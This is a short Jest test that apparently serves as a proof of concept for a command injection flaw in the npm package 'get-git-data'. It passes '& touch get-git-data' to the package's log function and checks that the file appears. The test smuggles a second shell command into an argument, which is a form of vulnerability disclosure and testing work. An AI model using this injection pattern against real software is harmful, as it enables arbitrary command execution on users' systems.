test("Command Injection in get-git-data", () => {
  const root = require("get-git-data");
  const fs = require("fs");
  const path = "./get-git-data";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let run = root.log("& touch get-git-data");

  run.then(() => {
    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
});
